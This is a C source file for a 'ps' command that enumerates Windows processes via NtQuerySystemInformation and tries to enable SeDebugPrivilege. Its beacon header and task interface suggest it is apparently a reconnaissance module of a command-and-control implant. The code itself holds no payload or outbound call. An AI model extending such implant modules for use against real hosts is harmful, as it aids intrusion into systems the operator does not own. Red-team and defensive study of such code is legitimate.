// ps — list running processes with extended info.
// Output: PID|PPID|SID|ARCH|MEM_KB|USER|NAME\n (pipe-separated).
// Uses NtQuerySystemInformation(SystemProcessInformation) to get core data
// (PID, PPID, session, memory, name) without requiring SeDebugPrivilege.
// Arch and User still use OpenProcess (best-effort).

#include "../core/beacon.h"

// Simple itoa into caller-supplied buffer; returns ptr past last digit.
static char* u32_to_dec(uint32_t v, char* buf) {
    if (!v) { *buf++ = '0'; return buf; }
    char tmp[12]; int n = 0;
    while (v) { tmp[n++] = (char)('0' + v % 10); v /= 10; }
    while (n--) *buf++ = tmp[n];
    return buf;
}

// Best-effort: enable SeDebugPrivilege if running as admin.
static void try_enable_debug_priv(void) {
    HANDLE hTok;
    if (!OpenProcessToken(GetCurrentProcess(),
                          TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hTok))
        return;
    TOKEN_PRIVILEGES tp;
    tp.PrivilegeCount = 1;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    if (LookupPrivilegeValueA(NULL, "SeDebugPrivilege",
                              &tp.Privileges[0].Luid)) {
        AdjustTokenPrivileges(hTok, FALSE, &tp, sizeof(tp), NULL, NULL);
    }
    CloseHandle(hTok);
}

// Resolve process owner via OpenProcessToken + LookupAccountSidA.
// Writes "DOMAIN\\user" into dst. Returns length or 0 on failure.
static int get_process_user(DWORD pid, char* dst, int dst_max) {
    HANDLE hProc = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
    if (!hProc) return 0;

    HANDLE hTok = NULL;
    if (!OpenProcessToken(hProc, TOKEN_QUERY, &hTok)) {
        CloseHandle(hProc);
        return 0;
    }

    DWORD needed = 0;
    GetTokenInformation(hTok, TokenUser, NULL, 0, &needed);
    if (!needed || needed > 4096) {
        CloseHandle(hTok); CloseHandle(hProc);
        return 0;
    }

    BYTE buf[4096];
    if (!GetTokenInformation(hTok, TokenUser, buf, needed, &needed)) {
        CloseHandle(hTok); CloseHandle(hProc);
        return 0;
    }

    TOKEN_USER* tu = (TOKEN_USER*)buf;
    char name[128] = {0}, domain[128] = {0};
    DWORD nameLen = 128, domLen = 128;
    SID_NAME_USE snu;
    if (!LookupAccountSidA(NULL, tu->User.Sid, name, &nameLen,
                           domain, &domLen, &snu)) {
        CloseHandle(hTok); CloseHandle(hProc);
        return 0;
    }

    CloseHandle(hTok);
    CloseHandle(hProc);

    int pos = 0;
    for (int i = 0; domain[i] && pos < dst_max - 2; ++i)
        dst[pos++] = domain[i];
    dst[pos++] = '\\';
    for (int i = 0; name[i] && pos < dst_max - 1; ++i)
        dst[pos++] = name[i];
    dst[pos] = '\0';
    return pos;
}

// Get process architecture via IsWow64Process (best-effort).
static void get_process_arch(DWORD pid, char* out) {
    out[0] = 'x'; out[1] = '6'; out[2] = '4'; out[3] = '\0';
    HANDLE hProc = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
    if (!hProc) { out[0] = '?'; out[1] = '\0'; return; }
    BOOL isWow64 = FALSE;
    if (IsWow64Process(hProc, &isWow64) && isWow64) {
        out[0] = 'x'; out[1] = '8'; out[2] = '6'; out[3] = '\0';
    }
    CloseHandle(hProc);
}

void cmd_ps(const BeaconTask* t) {
    (void)t;

    // If we're admin, enable SeDebugPrivilege for better Arch/User coverage.
    try_enable_debug_priv();

    // Allocate buffer for NtQuerySystemInformation.
    ULONG buf_size = 1024 * 1024;  // 1 MB initial
    BYTE* buf = (BYTE*)bmalloc(buf_size);
    if (!buf) {
        const char err[] = "alloc failed\n";
        out_write(err, sizeof(err) - 1);
        return;
    }

    ULONG ret_len = 0;
    NTSTATUS st = NtQuerySystemInformation(SystemProcessInformation,
                                           buf, buf_size, &ret_len);
    // Retry with a bigger buffer if needed.
    if (st == (NTSTATUS)0xC0000004L /* STATUS_INFO_LENGTH_MISMATCH */) {
        bfree(buf);
        buf_size = ret_len + 65536;
        buf = (BYTE*)bmalloc(buf_size);
        if (!buf) {
            const char err[] = "alloc failed\n";
            out_write(err, sizeof(err) - 1);
            return;
        }
        st = NtQuerySystemInformation(SystemProcessInformation,
                                      buf, buf_size, &ret_len);
    }
    if (st < 0) {
        const char err[] = "NtQuerySystemInformation failed\n";
        out_write(err, sizeof(err) - 1);
        bfree(buf);
        return;
    }

    // Header.
    const char hdr[] = "PID|PPID|SID|ARCH|MEM_KB|USER|NAME\n";
    out_write(hdr, sizeof(hdr) - 1);

    // Walk the linked-list of SYSTEM_PROCESS_INFORMATION entries.
    // SDK winternl.h hides InheritedFromUniqueProcessId as Reserved2 (PVOID).
    SYSTEM_PROCESS_INFORMATION* spi = (SYSTEM_PROCESS_INFORMATION*)buf;
    for (;;) {
        char line[1024]; char* p = line;
        char num[12]; char* e;

        DWORD pid  = (DWORD)(ULONG_PTR)spi->UniqueProcessId;
        DWORD ppid = (DWORD)(ULONG_PTR)spi->Reserved2;  // InheritedFromUniqueProcessId
        DWORD sid  = spi->SessionId;
        uint32_t mem_kb = (uint32_t)(spi->WorkingSetSize / 1024);

        // PID
        e = u32_to_dec(pid, num);
        rt_memcpy(p, num, (size_t)(e - num)); p += (e - num);
        *p++ = '|';

        // PPID
        e = u32_to_dec(ppid, num);
        rt_memcpy(p, num, (size_t)(e - num)); p += (e - num);
        *p++ = '|';

        // Session ID
        e = u32_to_dec(sid, num);
        rt_memcpy(p, num, (size_t)(e - num)); p += (e - num);
        *p++ = '|';

        // Arch (best-effort via OpenProcess + IsWow64Process)
        char arch[8];
        get_process_arch(pid, arch);
        for (int i = 0; arch[i]; ++i) *p++ = arch[i];
        *p++ = '|';

        // Memory KB (from SYSTEM_PROCESS_INFORMATION.WorkingSetSize)
        e = u32_to_dec(mem_kb, num);
        rt_memcpy(p, num, (size_t)(e - num)); p += (e - num);
        *p++ = '|';

        // User (best-effort via OpenProcessToken)
        char user[260];
        int ulen = get_process_user(pid, user, sizeof(user));
        if (ulen > 0) {
            rt_memcpy(p, user, (size_t)ulen); p += ulen;
        } else {
            *p++ = '-';
        }
        *p++ = '|';

        // Name: UNICODE_STRING → narrow (ASCII-safe for process names).
        if (spi->ImageName.Buffer && spi->ImageName.Length > 0) {
            int wlen = spi->ImageName.Length / (int)sizeof(WCHAR);
            for (int i = 0; i < wlen && i < 255; ++i) {
                WCHAR wc = spi->ImageName.Buffer[i];
                *p++ = (char)(wc & 0xFF);
            }
        } else {
            // PID 0 = System Idle, PID 4 = System
            if (pid == 0) {
                const char s[] = "[Idle]";
                for (int i = 0; s[i]; ++i) *p++ = s[i];
            } else {
                const char s[] = "System";
                for (int i = 0; s[i]; ++i) *p++ = s[i];
            }
        }
        *p++ = '\n';

        out_write(line, (size_t)(p - line));

        if (spi->NextEntryOffset == 0) break;
        spi = (SYSTEM_PROCESS_INFORMATION*)((BYTE*)spi + spi->NextEntryOffset);
    }

    bfree(buf);
}
